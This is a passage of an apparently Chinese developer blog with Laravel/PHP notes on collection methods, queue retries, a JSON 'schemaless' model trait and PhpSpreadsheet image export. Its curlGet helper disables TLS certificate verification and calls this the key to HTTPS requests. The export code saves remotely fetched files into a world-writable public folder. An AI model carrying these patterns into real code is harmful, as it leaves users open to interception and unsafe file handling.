class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "fantasy" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Jungle Book", "genre" =&gt; "fantasy", "rating" =&gt; 5, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "animation" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Zootopia", "genre" =&gt; "animation", "rating" =&gt; 4, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                </span><br><span class="line">                        $rating = $movies-&gt;groupBy(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> $movie[<span class="string">'rating'</span>];</span><br><span class="line">                        &#125;);</span><br><span class="line">                </span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                           8 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           9 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           4 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Zootopia","genre" =&gt; "animation", "rating" =&gt; 4,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           5 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Jungle Book","genre" =&gt; "fantasy","rating" =&gt; 5,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    $list = collect([</span><br><span class="line">                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                            ]);</span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//获取前两个名字</span></span><br><span class="line">                            $firstTwo = $list-&gt;take(<span class="number">2</span>);</span><br><span class="line">                            <span class="comment">//['Albert', 'Ben']</span></span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//获取最后两个名字</span></span><br><span class="line">                            $lastTwo = $list-&gt;take(<span class="number">-2</span>);</span><br><span class="line">                            <span class="comment">//['Yuri', 'Zane']</span></span><br><span class="line">                            $list = collect([</span><br><span class="line">                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                    ]);</span><br><span class="line">                            </span><br><span class="line">                                    $chunks = $list-&gt;chunk(<span class="number">3</span>);</span><br><span class="line">                                    $chunks-&gt;toArray();</span><br><span class="line">                                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                    [</span></span><br><span class="line"><span class="comment">                                        ["Albert", "Ben", "Charles",],</span></span><br><span class="line"><span class="comment">                                        [3 =&gt; "Dan", 4 =&gt; "Eric", 5 =&gt; "Xavier",],</span></span><br><span class="line"><span class="comment">                                        [6 =&gt; "Yuri", 7 =&gt; "Zane",],</span></span><br><span class="line"><span class="comment">                                    ]</span></span><br><span class="line"><span class="comment">                                    */</span></span><br><span class="line">                                     $names = collect([</span><br><span class="line">                                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                            ]);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                            &#125;);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;toArray();</span><br><span class="line">                                            <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br><span class="line">                                             $names = collect([</span><br><span class="line">                                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                                    ]);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                        <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                                    &#125;);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;toArray();</span><br><span class="line">                                                    <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br></pre></td></tr></table></figure>
<h3 id="队列执行失败反复执行"><a href="#队列执行失败反复执行" class="headerlink" title="队列执行失败反复执行"></a>队列执行失败反复执行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">由于报错或者什么原因队列执行失败，但是队列的 attempts一直为<span class="number">1</span>，可以手动<span class="keyword">throw</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">catch</span> (\Throwable $e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">"queue fail"</span>);</span><br><span class="line">&#125;</span><br><span class="line">php artisan xx --tries=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="实现Schemaless"><a href="#实现Schemaless" class="headerlink" title="实现Schemaless"></a>实现Schemaless</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">           id INT UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">           created_at timestamp <span class="literal">null</span>,</span><br><span class="line">           updated_at timestamp <span class="literal">null</span>,</span><br><span class="line">           data <span class="built_in">JSON</span> NOT NULL,</span><br><span class="line">           PRIMARY KEY(id)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add name VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.name'</span>))) AFTER id;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add address VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.address'</span>))) AFTER name;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add level INT UNSIGNED AS</span><br><span class="line">       (JSON_EXTRACT(data, <span class="string">'$.level'</span>)) AFTER name;</span><br><span class="line">然后是核心代码 Schemaless.php，以 trait 的方式实现：https:<span class="comment">//huoding.com/2017/01/14/590 </span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">trait Schemaless</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDirty</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $dirty = collect(parent::getDirty());</span><br><span class="line"></span><br><span class="line">        $keys = $dirty-&gt;keys()-&gt;map(<span class="function"><span class="keyword">function</span>(<span class="params">$key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array($key, $<span class="keyword">this</span>-&gt;virtual)) &#123;</span><br><span class="line">                $key = $<span class="keyword">this</span>-&gt;getDataColumn() . <span class="string">'-&gt;'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $key;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $keys-&gt;combine($dirty)-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$<span class="keyword">this</span>-&gt;exists) &#123;</span><br><span class="line">            $attributes = collect($<span class="keyword">this</span>-&gt;getAttributes());</span><br><span class="line"></span><br><span class="line">            $virtual = $attributes-&gt;only($<span class="keyword">this</span>-&gt;virtual);</span><br><span class="line"></span><br><span class="line">            $attributes = $attributes-&gt;diffKeys($virtual)-&gt;merge([</span><br><span class="line">                $<span class="keyword">this</span>-&gt;getDataColumn() =&gt; json_encode($virtual-&gt;all()),</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            $<span class="keyword">this</span>-&gt;setRawAttributes($attributes-&gt;all());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> parent::save($options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDataColumn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $column;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($column === <span class="literal">null</span>) &#123;</span><br><span class="line">            $column = defined(<span class="string">'static::DATA'</span>) ? <span class="keyword">static</span>::DATA : <span class="string">'data'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">接着是 Model 实现 User.php，里面激活了 schemaless，并设置了虚拟字段：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Schemaless;</span><br><span class="line"></span><br><span class="line">    protected $virtual = [<span class="string">'name'</span>, <span class="string">'address'</span>, <span class="string">'level'</span>];</span><br><span class="line"></span><br><span class="line">    protected $hidden = [<span class="string">'data'</span>];</span><br><span class="line">&#125;</span><br><span class="line">最后是 Controller 实现 UsersController.php，里面演示了如何创建和修改：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">User $user</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;user = $user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user;</span><br><span class="line"></span><br><span class="line">        $user-&gt;name = <span class="string">'老王'</span>;</span><br><span class="line">        $user-&gt;address = <span class="string">'东北'</span>;</span><br><span class="line">        $user-&gt;level = <span class="number">1</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user-&gt;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        $user-&gt;address = <span class="string">'北京'</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PhpSpreadsheet-导出图片到-Excel"><a href="#PhpSpreadsheet-导出图片到-Excel" class="headerlink" title="PhpSpreadsheet 导出图片到 Excel"></a>PhpSpreadsheet 导出图片到 Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line">       $sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line">       <span class="comment">//设置sheet的名字  两种方法 https://learnku.com/articles/26965</span></span><br><span class="line">       $sheet-&gt;setTitle(<span class="string">'phpspreadsheet——demo'</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;setTitle(<span class="string">'Hello'</span>);</span><br><span class="line">       <span class="comment">//设置第一行小标题</span></span><br><span class="line">       $k = <span class="number">1</span>;</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, <span class="string">'问题'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, <span class="string">'选项'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, <span class="string">'答案'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">'图片'</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 设置个表格宽度</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">16</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'B'</span>)-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'C'</span>)-&gt;setWidth(<span class="number">15</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'D'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 垂直居中</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'A'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'B'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'C'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'D'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line"></span><br><span class="line">       $info = $data;</span><br><span class="line">       <span class="comment">//  设置A单元格的宽度 同理设置每个</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line">       <span class="comment">//  设置第三行的高度</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getRowDimension(<span class="string">'3'</span>)-&gt;setRowHeight(<span class="number">50</span>);</span><br><span class="line">       <span class="comment">//  A1水平居中</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'alignment'</span> =&gt; [</span><br><span class="line">               <span class="string">'horizontal'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Alignment::HORIZONTAL_CENTER,</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       $sheet-&gt;getStyle(<span class="string">'A1'</span>)-&gt;applyFromArray($styleArray);</span><br><span class="line">       <span class="comment">//  将A3到D4合并成一个单元格</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;mergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  拆分合并单元格</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;unmergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  将A2到D8表格边框 改变为红色</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'borders'</span> =&gt; [</span><br><span class="line">               <span class="string">'outline'</span> =&gt; [</span><br><span class="line">                   <span class="string">'borderStyle'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THICK,</span><br><span class="line">                   <span class="string">'color'</span> =&gt; [<span class="string">'argb'</span> =&gt; <span class="string">'FFFF0000'</span>],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       <span class="comment">//  $sheet-&gt;getStyle('A2:E8')-&gt;applyFromArray($styleArray);</span></span><br><span class="line">       <span class="comment">//  设置超链接</span></span><br><span class="line">       <span class="comment">//  $sheet-&gt;setCellValue('D6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  $spreadsheet-&gt;getActiveSheet()-&gt;setCellValue('E6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  循环赋值</span></span><br><span class="line">       $k = <span class="number">2</span>;</span><br><span class="line">       foreach ($info <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, $value[<span class="string">'question'</span>]);</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, $value[<span class="string">'question_options'</span>]);</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, $value[<span class="string">'answer'</span>]);</span><br><span class="line"></span><br><span class="line">           $img = self::curlGet($value[<span class="string">'img'</span>]);</span><br><span class="line">           $dir = public_path(<span class="string">'/temp/image/'</span>);</span><br><span class="line">           $file_info = pathinfo($value[<span class="string">'img'</span>]);</span><br><span class="line">           <span class="keyword">if</span> (!empty($file_info[<span class="string">'basename'</span>])) &#123; <span class="comment">//过滤非文件类型</span></span><br><span class="line">               $basename = $file_info[<span class="string">'basename'</span>];</span><br><span class="line">               is_dir($dir) OR mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">//进行检测文件是否存在</span></span><br><span class="line">               file_put_contents($dir . $basename, $img);</span><br><span class="line"></span><br><span class="line">               $drawing[$k] = <span class="keyword">new</span> Drawing();</span><br><span class="line">               $drawing[$k]-&gt;setName(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setDescription(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setPath($dir . $basename);</span><br><span class="line">               $drawing[$k]-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setHeight(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setCoordinates(<span class="string">'D'</span>.$k);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetX(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetY(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setWorksheet($spreadsheet-&gt;getActiveSheet());</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">''</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           $sheet-&gt;getRowDimension($k)-&gt;setRowHeight(<span class="number">80</span>);</span><br><span class="line">           $k++;</span><br><span class="line">       &#125;</span><br><span class="line">       $file_name = date(<span class="string">'Y-m-d'</span>, time()) . rand(<span class="number">1000</span>, <span class="number">9999</span>);</span><br><span class="line">       <span class="comment">//  第一种保存方式</span></span><br><span class="line">       <span class="comment">/*$writer = new Xlsx($spreadsheet);</span></span><br><span class="line"><span class="comment">       //保存的路径可自行设置</span></span><br><span class="line"><span class="comment">       $file_name = '../'.$file_name . ".xlsx";</span></span><br><span class="line"><span class="comment">       $writer-&gt;save($file_name);*/</span></span><br><span class="line">       <span class="comment">//  第二种直接页面上显示下载</span></span><br><span class="line">       $file_name = $file_name . <span class="string">".xls"</span>;</span><br><span class="line">       header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line">       header(<span class="string">'Content-Disposition: attachment;filename="'</span> . $file_name . <span class="string">'"'</span>);</span><br><span class="line">       header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line">       $writer = IOFactory::createWriter($spreadsheet, <span class="string">'Xls'</span>);</span><br><span class="line">       <span class="comment">//  注意createWriter($spreadsheet, 'Xls') 第二个参数首字母必须大写</span></span><br><span class="line">       $writer-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getClient</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       $client = <span class="keyword">new</span> Client();</span><br><span class="line">       <span class="keyword">return</span> $client;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">curlGet</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $ch = curl_init();</span><br><span class="line">       curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// 这个是重点 请求https。</span></span><br><span class="line">       $data = curl_exec($ch);</span><br><span class="line">       curl_close($ch);</span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-集合的-“when”-方法"><a href="#Laravel-集合的-“when”-方法" class="headerlink" title="Laravel 集合的 “when” 方法"></a>Laravel 集合的 “when” 方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$hosts = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Eric Barnes'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jack Fruh'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jacob 